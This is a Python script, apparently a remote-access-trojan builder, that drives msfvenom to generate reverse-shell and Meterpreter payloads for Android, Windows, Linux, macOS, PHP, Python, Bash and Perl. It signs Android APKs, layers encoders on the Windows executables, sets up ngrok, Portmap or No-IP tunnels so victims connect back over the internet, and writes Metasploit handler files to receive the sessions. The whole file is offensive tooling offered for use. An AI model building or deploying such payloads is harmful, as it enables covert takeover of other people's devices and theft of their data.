#!/usr/bin/env python3

import os
import socket
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(('8.8.8.8', 80))
ip = sock.getsockname()[0]


def system():
    print('''\n[ 1 ] Android
[ 2 ] Windows
[ 3 ] Linux
[ 4 ] Mac
[ 5 ] PHP
[ 6 ] Python
[ 7 ] Bash
[ 8 ] Perl''')

#payloads
payload = (('windows/meterpreter/reverse_tcp', 'linux/x86/meterpreter/reverse_tcp', 'osx/x86/shell_reverse_tcp', 'php/meterpreter_reverse_tcp', 'cmd/unix/reverse_python', 'cmd/unix/reverse_bash', 'cmd/unix/reverse_perl'))

#formats
formt = (('exe', 'elf', 'macho', 'raw'))

#extensions
ext = (('exe', 'elf', 'macho', 'php', 'py', 'sh', 'pl'))


def network():
    print('''\n[ 1 ] Local Network
[ 2 ] External Network''')

def tunnels():
    print('''\n[ 1 ] Ngrok
[ 2 ] Portmap
[ 3 ] No-IP''')


def console_rc(name, content):
    file = open('{}-console.rc'.format(name), 'w')
    file.write(content)
    file.close()

def local(lhost, lport, payload, formt, ext):
    name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
    os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, lhost, lport, formt, name, ext))
    console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j'.format(payload, ip, lport))
    print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))

def external(tunnel, payload, formt, ext):
    name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')

    if tunnel == 1:
        lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
        os.system('termit -e "ngrok tcp {}" &>/dev/null'.format(lport))
        nport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok port\033[0m) > '))
        nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
        os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, nhost, nport, formt, name, ext))
        console_rc(name, 'use multi/handler\nset payload {}\nset lhost 127.0.0.1\nset lport {}\nexploit -j'.format(payload, lport))
        print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))

    elif tunnel == 2:
        lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
        pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
        phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
        os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, phost, pport, formt, name, ext))
        console_rc(name, 'use multi/handler\nset payload {}\nset lhost 127.0.0.1\nset lport {}\nexploit -j'.format(payload, lport))
        print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[\n'.format(name, ext, name, name))

    elif tunnel == 3:
        lhost = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
        lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
        os.system('msfvenom -p {} lhost={} lport={} -f {} > {}.{}'.format(payload, lhost, lport, formt, name, ext))
        console_rc(name, 'use multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j'.format(payload, lhost, lport))
        print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.{}\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, ext, name, name))


def main():

    system()
    sys = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32msystem\033[0m) > '))

    if sys == 1:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
            os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(ip, lport, name, name, name, name, name))
            console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(ip, lport))

        else:
            print('''\n[ 1 ] Ngrok
[ 2 ] Portmap
[ 3 ] No-IP''')
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

            if tunnel == 1:
                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                os.system('termit -e "ngrok tcp {}" &'.format(lport))
                nport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok port\033[0m) > '))
                nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
                os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(nhost, nport, name, name, name, name, name))
                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))

            elif tunnel == 2:
                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
                phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
                os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(phost, pport, name, name, name, name, name))
                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))

            elif tunnel == 3:
                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lhost = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(ip, lport, name, name, name, name, name))
                console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lhost, lport))
                print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))

    elif sys == 2:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
            os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(ip, lport, name))
            console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(ip, lport))

        elif net == 2:
            print('''\n[ 1 ] Ngrok
[ 2 ] Portmap
[ 3 ] No-IP''')
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

            if tunnel == 1:
                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                os.system('termit -e "ngrok tcp {}" &'.format(lport))
                nport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok port\033[0m) > '))
                nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(nhost, nport, name))
                os.system('rm -f {}'.format(name))
                console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))

            elif tunnel == 2:
                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
                phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(phost, pport, name))
                os.system('rm -f {}'.format(name))
                console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))

            elif tunnel == 3:
                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > ')
                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(lhost, lport, name))
                os.system('rm -f {}'.format(name))
                console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lhost, lport))
                print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))

    elif sys == 3:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            local(ip, lport, payload[1], formt[1], ext[1])
        elif net == 2:
            tunnels()
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
            external(tunnel, payload[1], formt[1], ext[1])

    elif sys == 4:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            local(ip, lport, payload[2], formt[2], ext[2])
        elif net == 2:
            tunnels()
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
            external(tunnel, payload[2], formt[2], ext[2])

    elif sys == 5:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            local(ip, lport, payload[3], formt[3], ext[3])
        elif net == 2:
            tunnels()
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
            external(tunnel, payload[3], formt[3], ext[3])

    elif sys == 6:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            local(ip, lport, payload[4], formt[3], ext[4])
        elif net == 2:
            tunnels()
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
            external(tunnel, payload[4], formt[3], ext[4])

    elif sys == 7:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            local(ip, lport, payload[5], formt[3], ext[5])
        elif net == 2:
            tunnels()
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
            external(tunnel, payload[5], formt[3], ext[5])

    elif sys == 8:

        network()
        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))

        if net == 1:
            lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
            local(ip, lport, payload[6], formt[3], ext[6])
        elif net == 2:
            tunnels()
            tunnel = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
            external(tunnel, payload[6], formt[3], ext[6])

if os.getuid() != 0:
    print('\033[33mPlease run it as root\033[0m')
v = sys.version[:5]
if '3.' not in v:
    print('\033[33mPlease run it with Python3\033[0m')
if os.getuid() == 0 and '3.' in v:
    main()
